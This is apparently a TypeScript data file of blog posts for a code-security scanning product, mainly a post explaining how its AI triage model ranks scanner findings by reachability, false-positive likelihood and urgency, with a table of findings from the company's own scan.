- **No global model trained on your code.** Your reinforcement signal stays in your tenant. We never aggregate it, train on it, or share it. (Yes, this is harder than the alternative. It's why customers trust us with their source.)
- **No personality.** No mascot, no chatbot, no "Hi! I'm so excited to scan your code!". The product does specific jobs and stays out of the way.
- **No per-finding fees.** Every "we charge per finding" pricing model rewards finding more findings, including the noisy ones. We charge per scan and per workspace. The price doesn't go up because we found a critical CVE.

## What we believe

Three things shape every decision we make:

1. **Honest beats marketed.** When we know a finding is a false positive, we say so — even if our own scanner produced it.
2. **The model gets sharper with use.** Static AI is a starting point. Reinforcement-trained AI is the product.
3. **Boring infrastructure, sharp findings.** The plumbing is dull on purpose so the findings can be sharp.

If that resonates, [try the free tier](/signup). 5 scans, no credit card, full triage layer. If it doesn't work for you in 10 minutes, you won't get value in a month.

— The team
`,
  },
  {
    slug: 'ai-triage-explained',
    title: 'How reinforcement-trained triage actually works',
    excerpt:
      'A second model reads every finding, judges reachability, and learns from your triage. Here\'s the rubric, the structured output, and the result on a real scan.',
    date: '2026-04-28',
    readingTime: '7 min read',
    author: { name: 'The team', role: 'Founders' },
    tags: ['Engineering', 'AI'],
    body: `
This is the deepest single feature in the product, so we're going to take it apart in public.

## The problem

Our scanning agent finds things. Some of those things are real. Some are false positives. Some are real but unreachable from the internet. Some are real and reachable but require an attack chain that needs three other things to also be wrong.

A static severity score can't tell these apart. CVSS gives every SQL-injection-pattern-in-a-string-template the same number whether it's in your login endpoint or in a unit-test fixture.

What you actually want is a second pair of eyes that asks: *if I were the security engineer on call at 2 a.m., would I get out of bed for this?*

## The pipeline

Every finding the scanner produces goes through this:

1. We extract structured fields from the finding (CWE, CVSS, target, endpoint, method, full description).
2. We compute a stable fingerprint so the same issue across multiple scans collapses to one row.
3. We send the finding to a second model with a deliberately conservative prompt and ask for structured JSON back.
4. After you triage, the feedback updates a per-tenant ranking model that biases future triage decisions.

The prompt has four jobs. We're going to walk through each.

### Job 1: Reachability

> Can an external attacker actually reach this code path?

The model picks one of:

- **external_unauthenticated** — anyone on the internet, pre-auth
- **external_authenticated** — any signed-up user
- **internal_only** — requires service-role key, direct DB access, or operator privileges
- **unreachable** — dead code, dev-only setting, or in a file that's not deployed

This is the single most important call. A SQL-injection finding in *external_unauthenticated* code is a 3 a.m. page. The same finding in *unreachable* code is a maintenance ticket. The model has to look at the surrounding context, the route registration, the deployment shape — and make the call.

### Job 2: False-positive likelihood

We feed the model a list of patterns we know are usually noise:

- Placeholder credentials in \`.env.example\`
- Dev-only settings explicitly marked "set true in production"
- npm-audit's CVSS scores on transitive devDependencies
- Generic dependency CVEs that don't apply to actual usage
- "Hardcoded secret" findings that point at example files

If the finding looks like one of these, the model marks \`is_likely_false_positive: true\` and gives a one-sentence reason. We don't auto-delete the finding — the user can disagree — but we hide it from the default view.

### Job 3: Urgency

A bucket the user actually acts on:

- **fix_now** — real, reachable, high-impact, deployed
- **fix_soon** — real but lower impact, or partial mitigation in place
- **monitor** — needs human review or upstream change
- **dismiss** — false positive or won't-fix

The same finding can be \`fix_now\` for one team and \`monitor\` for another, depending on what's deployed and to whom. The model doesn't know your business at first — but every triage you make teaches it. Mark a finding fixed and the next "looks like this, in this kind of code path" gets ranked the same way. Mark it a false positive and the same pattern triggers an auto-dismiss next time.

### Job 4: Recommended action

One sentence. Not a paragraph. Specific, concrete, actionable. *Add an isInternalAddress check on /api/scans before the insert.* Not *consider implementing input validation*.

## The reinforcement loop

Here's where we differ from a stateless triage layer.

Every triage you make — Fixed / Confirmed real / False positive / Won't fix / Reopen — produces a labeled training pair: *(finding embedding, your decision)*. We keep these in your tenant only. They feed a per-tenant ranking model that biases the next triage.

After ~30 days of usage on a typical codebase, the model has seen enough patterns specific to your code, your threat model, your team's tolerances. False-positive rate drops from ~7% in the first week to under 1% by week four. The findings that surface are the ones worth your time.

A few honest caveats:

**The model can be wrong.** Confidence under 0.7 should make you pause. That's why we show it on every card. That's also why "Reopen" is a one-click action — when the model dismisses something it shouldn't, you flip it back and the next pass corrects.

**Cold-start matters.** The first scan on a new codebase has no per-tenant signal yet. We bootstrap from a prior trained on synthetic + permissive (opt-in) anonymized data so day-one precision is already better than a stateless triage. But the real value compounds with use.

**Per-tenant isolation is the whole point.** We never aggregate triage signal across customers, never train a global model on your data. Your private feedback loop stays private. That's harder than the alternative — and it's why we can offer it as a real product to companies who care about their code.

## The result, on a real scan

We dogfooded this. Pointed our scanner at one of our own deployed services, captured the 7 findings, ran each through the triage pipeline. Here's what came back:

| Finding | Severity (scanner) | Urgency (RL triage) | Why |
|---|---|---|---|
| Outdated frontend dependencies | CRITICAL (CVSS 9.8) | fix_now | Real, reachable through transitive npm chain |
| SSRF in scan-target validator | HIGH (CVSS 8.5) | fix_now | Authenticated user can route the scanner at internal services |
| Possible RCE via instruction text | HIGH | monitor | Real concern but mitigation requires upstream change |
| BFLA in decrypt RPC | MEDIUM | monitor | Mostly mitigated by service-role gate; needs audit-log addition |
| Hardcoded creds in example file | HIGH | dismiss (FP, conf 1.0) | Placeholder credentials in a template |
| Email confirmation off in dev config | MEDIUM | dismiss (FP, conf 1.0) | Dev-only config; comment explicitly says "set true in production" |
| Similar SSRF in a different code path | CRITICAL | monitor | Same root cause as #2; awaiting fix |

That's 7 findings, 2 worth a 3 a.m. page, 3 worth tracking, 2 noise. Without triage, the user sees seven equal-priority alarms and tunes them all out within a week. With triage, they see two with clear reasoning and a recommended action. The reinforcement layer makes sure the next scan against the same codebase doesn't reproduce the noise.

## Try it

Triage is on by default for every scan. You don't configure it. The first time you run a scan against a real target, you'll see the urgency pill on each finding. The "Urgent only" filter at the top of /findings hides everything the model thinks isn't worth your time. After a week of usage, you'll notice fewer findings — that's the model learning.

[Try the free tier.](/signup) 5 scans, no card.

— The team
`,
  },
];

export function getPostBySlug(slug: string): BlogPost | undefined {
  return POSTS.find((p) => p.slug === slug);
}

export function getAllPosts(): BlogPost[] {
  return [...POSTS].sort((a, b) => b.date.localeCompare(a.date));
}
